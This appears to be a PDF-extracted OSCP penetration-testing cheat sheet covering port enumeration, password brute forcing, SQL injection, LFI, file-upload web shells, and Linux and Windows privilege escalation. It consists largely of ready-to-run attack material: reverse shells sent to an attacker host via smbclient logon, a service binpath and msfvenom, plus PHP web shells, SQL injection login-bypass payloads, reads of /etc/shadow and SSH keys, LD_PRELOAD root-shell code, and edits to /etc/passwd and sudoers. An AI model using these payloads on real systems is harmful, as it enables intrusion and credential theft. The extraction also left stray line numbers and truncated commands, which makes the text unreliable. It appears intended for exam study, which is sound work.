@@ -1,0 +1,1688 @@
+OSCP Notes
+https://www.linkedin.com/in/akinfosec/
+https://www.linkedin.com/in/akinfo
+sec/
+
+Enumeration
+Port Scanning :
+nmap -sC -sV -o nmap -A -T5 10.10.10.x
+1
+2
+Host Discovery
+3
+   •  nmap -sn 10.10.1.1-254 -vv -oA hosts
+4
+   •  netdiscover -r 10.10.10.0/24
+5
+6
+DNS server discovery
+7
+   •  nmap -p 53 10.10.10.1-254 -vv -oA dcs
+8
+   
+9
+NSE Scripts Scan 
+10
+   * nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog
+11
+   
+12
+Port specific NSE script list :
+13
+14
+   ls /usr/share/nmap/scripts/ssh*
+15
+   ls /usr/share/nmap/scripts/smb*
+16
+Scanning all 65535 ports :
+masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
+1
+ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sor
+2
+nmap -Pn -sV -sC -p$ports 10.10.10.x
+3
+4
+Running specific NSE scripts :
+5
+    nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A
+6
+sC - default scripts, sV - scan for versions, oA- output all  formats
+Optional - sT (performs full scan instead of syn-scan to prevent getting ﬂagged by ﬁrewalls)
+From Apache Version to ﬁnding Ubuntu version -> ubuntu httpd versions
+FTP : (Port 21)
+
+anonymous login check 
+ftp <ip address>
+username : anonymous
+pwd : anonymous
+ﬁle upload -> put shell.php
+SSH : (Port 22)
+id_rsa.pub : Public key that can be used in authorized_keys for login
+id_rsa : Private key that is used for login. Might ask for password. can be cracked with 
+ssh2john  and john
+id_rsa
+ssh -i id_rsa user@10.10.10.x
+For passwordless login, add id_rsa.pub to target's authorized_keys
+ssh2john
+DNS Zone transfer check : (Port 53)
+If port 53 is open
+Add host to /etc/hosts
+dig axfr smasher.htb @10.10.10.135
+https://ghostphisher.github.io/smasher2
+Add the extracted domain to /etc/hosts and dig again
+RPC Bind (111)
+rpcclient --user="" --command=enumprivs -N 10.10.10.10
+1
+rpcinfo –p 10.10.10.10
+2
+rpcbind -p 10.10.10.10 
+3
+RPC (135)
+rpcdump.py 10.11.1.121 -p 135
+1
+
+rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np // get pipe names
+2
+3
+rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
+4
+SMB (139 & 445)
+https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+nmap --script smb-protocols 10.10.10.10
+1
+2
+smbclient -L //10.10.10.10
+3
+smbclient -L //10.10.10.10 -N         // No password (SMB Null session)
+4
+smbclient --no-pass -L 10.10.10.10
+5
+smbclient //10.10.10.10/share_name
+6
+7
+smbmap -H 10.10.10.10
+8
+smbmap -H 10.10.10.10 -u '' -p ''
+9
+smbmap -H 10.10.10.10 -s share_name 
+10
+11
+crackmapexec smb 10.10.10.10 -u '' -p '' --shares
+12
+crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
+13
+crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
+14
+crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name
+15
+16
+enum4linux -a 10.10.10.10
+17
+18
+rpcclient -U "" 10.10.10.10
+19
+    * enumdomusers 
+20
+    * enumdomgroups
+21
+    * queryuser [rid]
+22
+    * getdompwinfo
+23
+    * getusrdompwinfo [rid]
+24
+25
+ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v
+26
+27
+mount -t cifs "//10.1.1.1/share/" /mnt/wins
+28
+29
+mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid
+30
+31
+SMB Shell to Reverse Shell : 
+32
+33
+    smbclient -U "username%password" //192.168.0.116/sharename
+34
+    smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash" 
+35
+    
+36
+Checklist :
+37
+    * Samba symlink directory traversal attack
+38
+
+SMB Exploits :
+Samba "username map script" Command Execution - CVE-2007-2447
+Version 3.0.20 through 3.0.25rc3
+Samba-usermap-exploit.py - 
+https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
+Eternal Blue - CVE-2017-0144
+SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 
+SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and 
+Windows 10 Gold, 1511, and 1607; and Windows Server 2016
+https://github.com/adithyan-ak/MS17-010-Manual-Exploit
+SambaCry - CVE-2017-7494
+4.5.9 version and before
+https://github.com/opsxcq/exploit-CVE-2017-7494
+SNMP (161) 
+snmpwalk -c public -v1 10.0.0.0
+1
+snmpcheck -t 192.168.1.X -c public
+2
+onesixtyone -c names -i hosts
+3
+nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
+4
+snmpenum -t 192.168.1.X
+5
+IRC (194,6667,6660-7000)
+nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 
+irked.htb
+https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor (exploit code)
+NFS (2049)
+showmount -e 10.1.1.27
+mkdir /mnt/nfs
+mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
+
+Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)
+MYSQL (3306)
+nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-
+hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-
+variables,mysql-vuln-cve2012-2122
+Redis (6379)
+In the output of conﬁg get * you could ﬁnd the home of the redis user (usually /var/lib/redis 
+or /home/redis/.ssh), and knowing this you know where you can write the 
+authenticated_users ﬁle to access via ssh with the user redis. If you know the home of other 
+valid user where you have writable permissions you can also abuse it: 
+1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa 
+2. Write the public key to a ﬁle : 
+(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt 
+3. Import the ﬁle into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit 
+4. Save the public key to the authorized_keys  ﬁle on redis server:
+root@Urahara:~# redis-cli -h 10.85.0.52
+1
+10.85.0.52:6379> config set dir /home/test/.ssh/
+2
+OK
+3
+10.85.0.52:6379> config set dbfilename "authorized_keys"
+4
+OK
+5
+10.85.0.52:6379> save
+6
+OK
+7
+Port Knocking :
+TCP
+1
+knock -v 192.168.0.116 4 27391 159
+2
+3
+UDP
+4
+knock -v 192.168.0.116 4 27391 159 -u
+5
+6
+
+TCP & UDP
+7
+knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
+8
+Misc :
+Run autorecon
+https://github.com/s0wr0b1ndef/OSCP-
+note/blob/master/ENUMERATION/enumeration
+IF NOTHING WORKS
+HTB Admirer (https://www.youtube.com/watch?
+v=_zMg0fHwwfw&ab_channel=IppSec)
+
+Bruteforce
+Directory Bruteforce 
+Cewl :
+cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10
+1
+2
+-d depth
+3
+-m minimum word length
+4
+-w output file
+5
+--lowercase lowercase all parsed words (optional)
+6
+Password / Hash Bruteforce
+ 
+Hashcat :
+https://hashcat.net/wiki/doku.php?id=example_hashes // m parameter
+https://mattw.io/hashID/types // hashid match
+hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw
+1
+hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt
+2
+hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR)
+3
+hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Tradit
+4
+hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Uni
+5
+hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress
+6
+John :
+john hashfile --wordlist=/home/kali/Desktop/rockyou.txt --format=raw-md5
+
+Online tools :
+https://crackstation.net/ 
+LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, 
+sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), 
+QubesV3.1BackupDefaults 
+https://www.dcode.fr/tools-list 
+MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher 
+https://www.md5online.org/md5-decrypt.html (MD5)
+https://md5.gromweb.com/ (MD5)
+Protocols Bruteforce
+ 
+Hydra
+TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, 
+RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, 
+SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, 
+Subversion/SVN, Firebird, LDAP2, Cisco AAA
+Medusa
+AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, 
+PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, 
+Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic 
+Wrapper, Web Form 
+Ncrack (Fastest)
+RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet 
+SSH
+ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5
+1
+hydra -L users.txt -P pass.txt 192.168.0.114 ssh
+2
+
+Wordlist 
+// For removing duplications in wordlist
+1
+cat wordlist.txt| sort | uniq > new_word.txt
+2
+SMB :
+ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v
+HTTP Post
+hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:use
+
+80, 443
+Checklist
+View SSL certiﬁcates for usernames
+View Source code 
+Check /robots.txt, .htaccess, .htpasswd
+Check HTTP Request
+Run Burp Spider
+View Console
+Use Nikto
+Check OPTIONS
+HTTP PUT / POST File upload 
+Parameter fuzzing with wfuzz
+Browser response vs Burp response
+Shell shock (cgi-bin/status)
+Cewl wordlist and directory bruteforce
+nmap --script http-enum 192.168.10.55 
+Apache version exploit & other base server exploits
+Port 443 :
+nmap -Pn -sV  --script ssl* -p 443 10.10.10.60 -A -T5
+Heartbleed ( sslyze --heartbleed <ip> )
+Heartbleed exploit code (https://gist.github.com/eelsivart/10174134)
+Shellshock
+Poodle
+IIS :
+https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
+Try changing ﬁle.asp ﬁle to ﬁle.asp.txt to reveal the source code of the ﬁles
+Apache :
+Struts (https://github.com/LightC0der/Apache-Struts-0Day-Exploit)
+Shell shock (https://www.exploit-db.com/exploits/34900)
+OpenFuck (https://github.com/exploit-inters/OpenFuck)
+ 
+
+Directory Enumeration
+Apache : x -> php, asp, txt, xml, bak
+IIS : x-> asp, aspx, txt, ini, tmp, bak, old
+Gobuster quick directory busting
+gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -
+Gobuster search with ﬁle extension
+gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100
+1
+2
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.tx
+3
+4
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-direc
+5
+Gobuster comprehensive directory busting
+gobuster -s 200,204,301,302,307,403 -w /usr/share/seclists/Discovery/Web_Con
+ 
+gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-
+medium.txt -k -u http://10.10.10.x 
+-k (ignore ssl veriﬁcation)
+-x speciﬁc extension
+Dirbuster
+Change wordlists (Wfuzz, dirb)
+Custom directory enumeration (HTB Obscurity)
+wfuzz -c -z ﬁle,common.txt -u 
+http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+
+Parameter Fuzzing 
+WFUZZ
+hc - status code to ignore
+hw - word length to ignore
+hh - char length to ignore
+hl - line length to ignore
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 ht
+Wordpress
+ 
+Wpscan 
+wpscan --url http://10.10.10.10 -e u,vp // enumerate users & vulnerable plu
+1
+2
+wpscan --url 10.10.10 --passwords rockyou.txt --usernames elliot
+3
+Metasploit 
+use auxiliary/scanner/http/wordpress_login_enum
+Username Enumeration via Bruteforce 
+
+SecurityCompass/wordpress-scripts
+https://github.com/SecurityCompass/wo
+rdpress-
+scripts/blob/master/wp_login_user_enum
+eration.py
+python wp_brute.py -t   http://10.10   -u usernames.txt 
+
+SQL Injection
+Payloads
+'
+1
+)'
+2
+"
+3
+`
+4
+')
+5
+")
+6
+`)
+7
+'))
+8
+"))
+9
+`))
+10
+'-SLEEP(30); #
+11
+Login Bypass
+Both user and password or specific username and payload as password
+1
+2
+' or 1=1 --
+3
+' or '1'='1
+4
+' or 1=1 --+
+5
+user' or 1=1;#
+6
+user' or 1=1 LIMIT 1;#
+7
+user' or 1=1 LIMIT 0,1;#
+8
+UNION BASED SQL 
+order by 1
+1
+' UNION SELECT 1,2,3 -- - 
+2
+' UNION SELECT 1,@@version,3 -- -
+3
+' UNION SELECT 1,user(),3 -- - 
+4
+' UNION SELECT 1,load_file('/etc/passwd'),3 -- - 
+5
+' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -     //hex encod
+6
+7
+' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100))
+8
+,3 -- -          // char encode
+9
+
+// List databases available
+1
+' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema
+2
+3
+// Fetch Table names
+4
+' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables 
+5
+union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+6
+7
+// Fetch Column names from Table
+8
+' UNION SELECT 1,group_concat(column_name),3 from information_schema.column
+9
+union all select 1,2,3,4,column_name,6 FROM information_schema.columns wher
+10
+11
+// Dump data from Columns using 0x3a as seperator
+12
+' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -
+13
+14
+// Backdoor
+15
+16
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OU
+17
+MSSQL 
+'; WAITFOR DELAY '00:00:30'; --
+
+File Upload
+HTTP PUT
+nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav
+1
+2
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
+3
+Cadaver
+cadaver http://192.168.1.103/dav/
+1
+put /tmp/shell.php
+2
+JPG to PNG shell 
+<?php system($_GET['cmd']); ?>  //shell.php
+1
+exiftool "-comment<=shell.php" malicious.png
+2
+strings malicious.png | grep system
+3
+Upload Files through POST
+# POST file
+1
+curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php 
+2
+3
+# POST binary data to web form
+4
+curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;"
+5
+POST binary data to a web form
+ 
+
+curl -F "ﬁeld=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -
+v
+PUTing File on the Webhost via PUT verb
+curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
+
+LFI
+Files
+/etc/passwd
+1
+/etc/shadow
+2
+/etc/knockd.conf     // port knocking config
+3
+LFI with Wfuzz
+wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt 
+Basic LFI
+http://url/index.php?page=../../../etc/passwd
+1
+http://url/index.php?page=../../../etc/shadow
+2
+http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub
+3
+http://url/index.php?page=../../../home/user/.ssh/id_rsa
+4
+http://url/index.php?page=../../../home/user/.ssh/authorized_keys
+5
+Null byte (%00)
+http://url/index.php?page=../../../etc/passwd%00
+php://ﬁlter
+http://url/index.php?page=php://filter/convert.base64-encode/resource=index
+1
+http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=index
+2
+
+input://
+http://url/index.php?page=php://input
+1
+POST DATA: <?php system('id'); ?>
+2
+
+Linux Privilege Escalation
+OS & User Enumeration :
+############################### User Enumeration ##########################
+1
+2
+whoami
+3
+id
+4
+sudo -l
+5
+cat /etc/passwd
+6
+ls -la /etc/shadow
+7
+8
+################################# OS Enumeration ##########################
+9
+10
+cat /etc/issue
+11
+cat /etc/*-release
+12
+cat /proc/version
+13
+uname -a
+14
+arch
+15
+ldd --verion
+16
+17
+################################# Installed tools #########################
+18
+19
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 
+20
+21
+############################ File owners and permissions ##################
+22
+23
+ls -la
+24
+find . -ls
+25
+history
+26
+cat ~/.bash_history
+27
+find / -type f -user <username> -readable 2> /dev/null # Readable files for
+28
+find / -writable -type d 2>/dev/null # Writable files by the user
+29
+find /usr/local/ -type d -writable
+30
+31
+################################## File mount #############################
+32
+33
+/mnt /media -> usb devices and other mounted disks
+34
+mount -> show all the mounted drives
+35
+df -h -> list all partitions
+36
+cat /etc/fstab # list all drives mounted at boot time
+37
+/bin/lsblk
+38
+39
+#################################### Applications #########################
+40
+41
+dpkg -l # for Debian based systems
+42
+43
+
+##################################### Cron tabs ###########################
+44
+45
+ls -lah /etc/cron*
+46
+cat /etc/crontab
+47
+ls -la /var/log/cron*           # Locating cron logs
+48
+find / -name cronlog 2>/dev/null
+49
+grep "CRON" /var/log/cron.log   # for locating running jobs from logs
+50
+grep CRON /var/log/syslog       # grepping cron from syslog
+51
+52
+53
+#################################### Internal Ports #######################
+54
+55
+Netstat -alnp | grep LIST | grep port_num
+56
+Netstat -antp
+57
+netstat -tulnp
+58
+curl the listening ports
+59
+60
+################################### Interesting DIRS ######################
+61
+ /
+62
+ /dev 
+63
+ /scripts 
+64
+ /opt 
+65
+ /mnt 
+66
+ /var/www/html 
+67
+ /var 
+68
+ /etc 
+69
+ /media
+70
+ /backup
+71
+72
+################################### SUID Binaries #########################
+73
+74
+(https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binar
+75
+76
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/
+77
+find / -perm -u=s -type f 2>/dev/null
+78
+find / -perm -4000 -user root 2>/dev/null
+79
+ldd /usr/bin/binary-name
+80
+strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such file
+81
+82
+################################# Firewall Enumeration ####################
+83
+84
+grep -Hs iptables /etc/*
+85
+86
+############################### Kernal Modules ############################
+87
+88
+lsmod
+89
+/sbin/modinfo <mod name>
+90
+91
+92
+
+PrivEsc Checklist :
+sudo rights (https://medium.com/schkn/linux-privilege-escalation-using-text-editors-
+and-ﬁles-part-1-a8373396708d)
+sensitive ﬁles & permission misconﬁguration (SSH keys, shadow ﬁles) 
+SUID Binaries
+Internal Ports
+Processes running with root privilege 
+Cron tabs
+Hidden cron process with pspy
+Mounted ﬁlesystems
+TMUX session hijacking
+Path Hijacking
+Process Injection (https://github.com/nongiach/sudo_inject)
+Docker PS
+Interesting groups (https://book.hacktricks.xyz/linux-unix/privilege-
+escalation/interesting-groups-linux-pe)
+Wheel
+Shadow
+Disk 
+Video
+Root
+Docker
+lxd - (https://www.hackingarticles.in/lxd-privilege-escalation/)
+Environment variables
+bash version < 4.2-048 | 4.4 (https://tryhackme.com/room/linuxprivesc Task 14, 15)
+NFS Misconﬁguration
+linpeas.sh -a //all checks
+SUID Shared Object Injection :
+Find a SUID binary that looks ﬁshy
+strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such 
+file" 
+Match the shared object that sits in a path where you have write access
+create a shared object in the missing SO ﬁle name
+run the SUID binary
+
+NFS Misconﬁguration : 
+https://tryhackme.com/room/linuxprivesc (Task 19)
+cat /etc/exports 
+On Kali 
+mkdir /tmp/nfs 
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs 
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o 
+/tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+On Target 
+/tmp/shell.elf
+Kernel Exploits 
+ 
+cat /proc/version 
+uname -r  
+uname -mrs 
+cat /etc/lsb-release 
+cat /etc/os-release 
+gcc exploit.c -o exp 
+Compile exploit in local machine and upload to remote machine
+gcc -m32 -Wl,--hash-style=both 9542.c -o 9542 
+apt-get install gcc-multilib 
+Recover Deleted Files :
+extundelete (HTB mirai - https://tiagotavares.io/2017/11/mirai-hack-the-box-retired/)
+strings
+C Program to SetUID /bin/bash :
+gcc -Wall suid.c -o exploit 
+
+sudo chown root exploit 
+sudo chmod u+s exploit 
+$ ls -l exploit 
+-rwsr-xr-x 1 root users 6894 11 sept. 22:05 exploit 
+#include <unistd.h>
+1
+2
+int main()
+3
+{
+4
+    setuid(0);
+5
+    execl("/bin/bash", "bash", (char *)NULL);
+6
+    return 0;
+7
+} 
+ 
+8
+./exploit 
+# whoami 
+  root 
+Tools :
+Linux Exploit Suggester (HTB Nibbles) (https://github.com/mzet-/linux-exploit-
+suggester)
+SUIDENUM (https://github.com/Anon-Exploiter/SUID3NUM)
+LinEnum.sh (https://github.com/rebootuser/LinEnum)
+linpeas.sh (https://github.com/carlospolop/privilege-escalation-awesome-scripts-
+suite/tree/master/linPEAS)
+Linprivchecker (https://github.com/sleventyeleven/linuxprivchecker)
+pspy (https://github.com/DominicBreuker/pspy) (crontabs)
+Resources :
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+https://github.com/Ignitetechnologies/Privilege-Escalation
+https://gtfobins.github.io/
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Mysql
+MYSQL UDF Exploit: https://www.exploit-db.com/exploits/1518
+gcc -g -c raptor_udf2.c -fPIC
+1
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -
+2
+3
+mysql -u root
+4
+5
+use mysql;
+6
+create table foo(line blob);
+7
+insert into foo values(load_file('/home/raptor_udf2.so'));
+8
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+9
+create function do_system returns integer soname 'raptor_udf2.so';
+10
+11
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+12
+13
+exit 
+14
+15
+user@target$ /tmp/rootbash -p
+16
+MYSQL running as root :
+mysql -u root
+1
+2
+select sys_exec('whoami');
+3
+select sys_eval('whoami');
+4
+5
+/* If function doesnt exist, create the function */
+6
+CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
+7
+8
+if NULL returns, try redirecting the errors
+9
+select sys_eval('ls /root 2>&1');
+10
+
+Sudo Abuse
+$ sudo -l
+1
+[sudo] password for appadmin:
+2
+User appadmin may run the following commands on this host:
+3
+                (root) /opt/Support/start.sh
+4
+Checklist 
+Write permission to start.sh 
+write permission to the  /opt/support 
+Create start.sh  if doesn't exist
+Environment Variables 
+(https://tryhackme.com/room/linuxprivesc)
+ 
+Check which environment variables are inherited (look for the env_keep options):
+sudo -l 
+LD_PRELOAD 
+LD_PRELOAD  is an optional environmental variable containing one or more paths to shared 
+libraries, or shared objects, that the loader will load before any other shared library including 
+the C runtime library.
+/* Preload.c */
+1
+2
+#include <stdio.h>
+3
+#include <sys/types.h>
+4
+#include <stdlib.h>
+5
+6
+void _init() {
+7
+
+        unsetenv("LD_PRELOAD");
+8
+        setresuid(0,0,0);
+9
+        system("/bin/bash -p");
+10
+}
+11
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c 
+Run one of the programs you are allowed to run via sudo (listed when running sudo -l), 
+while setting the LD_PRELOAD  environment variable to the full path of the new shared 
+object:
+sudo LD_PRELOAD=/tmp/preload.so program-name-here 
+LD_LIBRARY_PATH 
+LD_LIBRARY_PATH  provides a list of directories where shared libraries are searched for ﬁrst.
+Run ldd  against the any program that you can execute as sudo (sudo -l) to see which 
+shared libraries are used by the program:
+ldd /usr/sbin/apache2 
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using
+the code located at /home/user/tools/sudo/library_path.c:
+/* Library_path.c */
+1
+2
+#include <stdio.h>
+3
+#include <stdlib.h>
+4
+5
+static void hijack() __attribute__((constructor));
+6
+7
+void hijack() {
+8
+        unsetenv("LD_LIBRARY_PATH");
+9
+        setresuid(0,0,0);
+10
+        system("/bin/bash -p");
+11
+}
+12
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c 
+Run program using sudo, while settings the LD_LIBRARY_PATH environment variable to 
+/tmp (where we output the compiled shared object):
+sudo LD_LIBRARY_PATH=/tmp program-name-here 
+
+Escalation Methods
+echo root:gl0b0 | /usr/sbin/chpasswd
+1
+2
+// exploit : exploit (pwd)
+3
+echo "exploit:YZE7YPhZJyUks:0:0:root:/root:/bin/bash" >> /etc/passwd | su -
+4
+5
+nano /etc/passwd -> change GID to root
+6
+7
+nano /etc/sudoers -> user ALL=(ALL) NOPASSWD:ALL
+8
+9
+cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash;
+10
+/tmp/rootbash -p
+11
+
+Windows Privilege Escalation
+Enumeration 
+OS Info Enumeration
+systeminfo 
+hostname 
+echo %username%
+wmic qfe -> check patches 
+wmic logicaldisk -> get other disk information 
+User Enumeration
+whoami 
+whoami /priv -> check user privilleges 
+whoami /groups -> check user groups 
+net user -> list all users 
+net user <username> -> check groups associated with a user 
+net localgroup -> Check all the local groups available 
+net localgroup <group name> -> List the members of the given localgroup 
+Task | Service | Process Enumeration
+sc queryex type= service (Lists all the service) 
+tasklist /SVC  
+tasklist  
+net start  
+DRIVERQUERY 
+wmic product get name, version,  vendor 
+Permission Enumeration
+C:\Program Files : icacls program_name
+icacls root.txt /grant <username>:F (to grant permission to access ﬁle)
+Check the PowerShell history ﬁle 
+type 
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadlin
+e\ConsoleHost_history.txt 
+Check stored usernames and passwords
+cmdkey /list 
+
+Network based
+ipconfig 
+ipconfig /all 
+arp -a 
+router print 
+netstat -ano 
+Password Hunting
+findstr /si password *.txt *.ini *.config (try searching in differe
+1
+dir /s *pass* == *cred* == *vnc* == *.config*
+2
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc*
+3
+where /R C:\ user.txt
+4
+where /R C:\ *.ini
+5
+Swisskyrepo for manual pwd enumeration
+AV / Firewall check / Service Enumeration
+sc query windefend 
+1
+netsh advfirewall firewall dump
+2
+netsh advfirewall show currentprofile
+3
+netsh advfirewall firewall show rule name=all
+4
+netsh firewall show state (show firewall running or stopped)
+5
+netsh firewall show config (show firewall configuration)
+6
+7
+netsh firewall set opmode disable # Disable firewall
+8
+Scheduled Tasks
+schtasks /query /fo LIST /v
+Mount Information
+
+mountvol  
+Escalation Techniques 
+ 
+Service Account Priv Esc (Token Impersonation)
+whoami /priv
+Run As :
+Use the cmdkey  to list the stored credentials on the machine.
+cmdkey /list
+1
+Currently stored credentials:
+2
+ Target: Domain:interactive=WORKGROUP\Administrator
+3
+ Type: Domain Password
+4
+ User: WORKGROUP\Administrator
+5
+Using runas  with a provided set of credential.
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c
+Access check :
+accesschk.exe -ucqv [service_name] /accepteula 
+accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 
+8) 
+ 
+
+Find all weak folder permissions per drive. 
+accesschk.exe /accepteula -uwdqs Users c:\ 
+ 
+accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\ 
+ 
+Find all weak ﬁle permissions per drive. 
+accesschk.exe /accepteula -uwsv "Everyone" "C:\Program Files" 
+accesschk.exe /accepteula -uwqs Users c:\*.* 
+ 
+accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.* 
+ 
+Powershell : 
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -m
+Binary planting 
+ (https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)
+sc qc [service_name] // for service properties 
+sc query [service_name] // for service status 
+sc config [service_name] binpath= "C:\Temp\nc.exe -nv [RHOST] [RPORT] -
+e C:\WINDOWS\System32\cmd.exe" 
+ 
+sc config [service_name] obj= ".\LocalSystem" password= "" 
+ 
+net start [service_name] 
+Unquoted Service Path Privilege Escalation 
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" 
+Always Install Elevated :
+
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+2
+3
+msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 –f  msi > i
+4
+5
+C:> msiexec /quiet /qn /i  install.msi
+6
+Kernel Exploits :
+https://github.com/abatchy17/WindowsExploits
+https://github.com/SecWiki/windows-kernel-exploits
+run systeminfo  | capture the output and run windows-exploit-suggester.py
+Compiling Kernel Exploits :
+i686-w64-mingw32-gcc exploit.c -o exploit
+or for 32 bit
+i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32 
+Automated Enumeration Tools
+ 
+Powershell:
+powershell -ep bypass
+load powershell (only in meterpreter)
+Sherlock (https://github.com/rasta-mouse/Sherlock)
+https://github.com/PowerShellMaﬁa/PowerSploit/tree/master/Privesc (PowerUp)
+EXE : (https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#exe)
+
+WinPeas [ https://github.com/carlospolop/privilege-escalation-awesome-scripts-
